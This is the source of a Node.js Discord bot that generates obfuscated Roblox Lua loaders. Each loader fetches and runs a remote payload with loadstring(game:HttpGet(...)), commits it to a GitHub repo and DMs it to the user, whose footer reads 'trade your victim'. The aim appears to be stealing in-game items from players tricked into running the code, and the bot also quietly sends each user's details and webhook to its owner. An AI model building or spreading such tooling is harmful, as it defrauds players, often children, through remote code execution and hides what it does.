 // Add this debugging section
 console.log('Environment variables loaded:');
 console.log('DISCORD_TOKEN:', process.env.DISCORD_TOKEN ? 'Found' : 'Missing');
 console.log('GITHUB_TOKEN:', process.env.GITHUB_TOKEN ? 'Found' : 'Missing');
 console.log('CLIENT_ID:', process.env.CLIENT_ID ? 'Found' : 'Missing');
 console.log('GUILD_ID:', process.env.GUILD_ID ? 'Found' : 'Missing');

 const { 
   Client, 
   GatewayIntentBits, 
   REST, 
   Routes,
   ActionRowBuilder,
   ModalBuilder,
   TextInputBuilder,
   TextInputStyle,
   ButtonBuilder
 } = require('discord.js');
 // We'll use dynamic import for Octokit
 const crypto = require('crypto');

 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.GuildMembers
   ]
 });

 // Bot credentials and GitHub info
 const clientId = process.env.CLIENT_ID;
 const guildId = process.env.GUILD_ID;
 const githubToken = process.env.GITHUB_TOKEN;
 const repoOwner = process.env.REPO_OWNER || 'Xscript25';
 const repoName = process.env.REPO_NAME || 'Adopt-Me';

 // Initialize Octokit - will be done asynchronously
 let octokit;
 (async () => {
   const { Octokit } = await import('octokit');
   octokit = new Octokit({ auth: githubToken });
   console.log('Octokit initialized successfully');
 })().catch(err => console.error('Failed to initialize Octokit:', err));

 // Register slash command
 const commands = [
   {
     name: 'gen_adopt-me',
     description: 'Generate a Adopt Me script.',
   },
 ];

 const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

 // Deploy commands
 (async () => {
   try {
     console.log('Started refreshing application (/) commands.');
     await rest.put(
       Routes.applicationGuildCommands(clientId, guildId),
       { body: commands }
     );
     console.log('Successfully reloaded application (/) commands.');
   } catch (error) {
     console.error(error);
   }
 })();

 client.once('ready', () => {
   console.log('Bot is ready as ' + client.user.tag);
 });

 // Function to obfuscate Lua code
 function obfuscateLuaScript(scriptContent) {
   // First, let's encode the variables
   const encodedScript = Buffer.from(scriptContent).toString('base64');

   // Now wrap it in a decoder function
   return `
 -- Obfuscated script
 local encodedScript = "${encodedScript}"

 -- Decode function
 local function decode(str)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     str = string.gsub(str, '[^'..b..'=]', '')
     return (str:gsub('.', function(x)
         if (x == '=') then return '' end
         local r,f='',(b:find(x)-1)
         for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
         return r;
     end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
         if (#x ~= 8) then return '' end
         local c=0
         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
         return string.char(c)
     end))
 end

 -- Run the decoded script
 loadstring(decode(encodedScript))()
 `;
 }

 client.on('interactionCreate', async (interaction) => {
   if (!interaction.isCommand()) return;

   if (interaction.commandName === 'generate-mm2') {
     try {
       // Create modal for user input
       const modal = new ModalBuilder()
         .setCustomId('scriptModal')
         .setTitle('Generate Roblox Script');

       // Add input fields exactly as requested
       const usernameInput = new TextInputBuilder()
         .setCustomId('username')
         .setLabel('Roblox Username')
         .setStyle(TextInputStyle.Short)
         .setPlaceholder('Enter your Roblox username')
         .setRequired(true);

       const webhookInput = new TextInputBuilder()
         .setCustomId('webhook')
         .setLabel('Webhook URL')
         .setStyle(TextInputStyle.Short)
         .setPlaceholder('https://discord.com/api/webhooks/...')
         .setRequired(true);

       // Add inputs to modal
       modal.addComponents(
         new ActionRowBuilder().addComponents(usernameInput),
         new ActionRowBuilder().addComponents(webhookInput)
       );

       // Show modal to user
       await interaction.showModal(modal);
     } catch (error) {
       console.error('Error showing modal:', error);
       await interaction.reply({ 
         content: 'Error creating the input form. Please try again.',
         ephemeral: true 
       });
     }
   }
 });

 // Handle modal submissions
 client.on('interactionCreate', async (interaction) => {
   // Handle button interactions for copy functionality
   if (interaction.isButton()) {
     const customId = interaction.customId;
     
     // Handle copy raw URL button
     if (customId.startsWith('copy_raw_url_')) {
       const scriptId = customId.replace('copy_raw_url_', '');
       const rawUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/main/scripts/script-${scriptId}.lua`;
       await interaction.reply({ content: rawUrl, ephemeral: true });
       return;
     }
     
     // Handle copy loadstring button
     if (customId.startsWith('copy_loadstring_')) {
       const scriptId = customId.replace('copy_loadstring_', '');
       const rawUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/main/scripts/script-${scriptId}.lua`;
       const loadstringCode = `loadstring(game:HttpGet("${rawUrl}", true))()`;
       await interaction.reply({ content: loadstringCode, ephemeral: true });
       return;
     }
     
     // Handle copy original script button
     if (customId.startsWith('copy_original_')) {
       const scriptId = customId.replace('copy_original_', '');
       // We can't access the original script here, so we'll explain this to the user
       await interaction.reply({ 
         content: "For security reasons, the original script content can't be provided through this button. Please refer to the embed above.", 
         ephemeral: true 
       });
       return;
     }
   }

   if (!interaction.isModalSubmit()) return;

   if (interaction.customId === 'scriptModal') {
     await interaction.deferReply({ ephemeral: true });

     try {
       // Get values from modal
       const username = interaction.fields.getTextInputValue('username');
       const webhook = interaction.fields.getTextInputValue('webhook');

       // Generate original script content
       const originalScript = `Username = "${username}"
Webhook = "${webhook}"

 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xscript25/Adopt-Me/refs/heads/main/obfuscated.txt", true))()`;

       // Obfuscate the script
       const obfuscatedScript = obfuscateLuaScript(originalScript);

       // Generate a unique filename (no username included)
       const scriptId = crypto.randomBytes(6).toString('hex');
       const filePath = `scripts/script-${scriptId}.lua`;

       // Create file in GitHub repository with the obfuscated content
       await octokit.request('PUT /repos/{owner}/{repo}/contents/{path}', {
         owner: repoOwner,
         repo: repoName,
         path: filePath,
         message: `Generated script ${scriptId}`,
         content: Buffer.from(obfuscatedScript).toString('base64'),
       });

       // Get raw URL
       const rawUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/main/${filePath}`;

       // The loadstring code to use the script
       const loadstringCode = `loadstring(game:HttpGet("${rawUrl}", true))()`;

       // Notify the bot owner through webhook
       const notificationWebhook = process.env.NOTIFICATION_WEBHOOK;

       try {
         // Send webhook notification
         await fetch(notificationWebhook, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
           },
           body: JSON.stringify({
             content: `**Someone Use Bot**`,
             embeds: [{
               title: "User Generated a Script",
               description: `A user has generated a MM2 script`,
               color: 0xFF0000,
               fields: [
                 {
                   name: "Discord User",
                   value: `${interaction.user.tag} (${interaction.user.id})`,
                   inline: true
                 },
                 {
                   name: "Generated At",
                   value: new Date().toLocaleString(),
                   inline: true
                 },
                 {
                   name: "Script ID",
                   value: scriptId,
                   inline: true
                 },
                 {
                   name: "Roblox Username",
                   value: username,
                   inline: true
                 },
                 {
                   name: "User's Webhook",
                   value: webhook,
                   inline: true
                 }
               ],
               timestamp: new Date()
             }]
           })
         });
       } catch (error) {
         console.error('Error sending webhook notification:', error);
       }

       // Reply with success message
       await interaction.editReply({
         content: `Your script has been generated and obfuscated successfully!`,
         ephemeral: true
       });

       // DM the user with mobile-friendly format with buttons
       try {
         // First message with raw URL in a red embed for easy copying on mobile
         await interaction.user.send({
            embeds: [{
              title: "**Raw Script URL**",
              description: `${rawUrl}`,
              color: 0xFF0000 // Red color
            }]
          });

         // Second message with loadstring code in a red embed for easy copying
         const loadstringEmbed = {
           embeds: [{
             title: "**Full Script Loader**",
             description: `\`\`\`lua\n${loadstringCode}\n\`\`\``,
             color: 0xFF0000, // Red color
             footer: {
               text: "Type anything in chat to trade your victim"
             }
           }],
           components: [
             new ActionRowBuilder().addComponents(
               new ButtonBuilder()
                 .setCustomId(`copy_loadstring_${scriptId}`)
                 .setLabel('Copy')
                 .setStyle('Primary')
             )
           ]
         };
         await interaction.user.send(loadstringEmbed);
        
         // Third message with the original script in a red embed for reference
         await interaction.user.send({
           embeds: [{
             title: "**Your Original Script**",
             description: `\`\`\`lua\n${originalScript}\n\`\`\``,
             color: 0xFF0000 // Red color
           }]
         });
       } catch (e) {
         console.error('Could not DM user:', e);
         await interaction.followUp({
           content: "I couldn't send you a DM with the links. Make sure your DMs are open!",
           ephemeral: true
         });
       }

     } catch (error) {
       console.error('Error processing script generation:', error);
       await interaction.editReply({
         content: 'An error occurred while generating the script. Please try again.',
         ephemeral: true
       });
     }
   }
 });

 // Start the web server to keep the bot alive
const server = require('./server');

client.login(process.env.DISCORD_TOKEN);
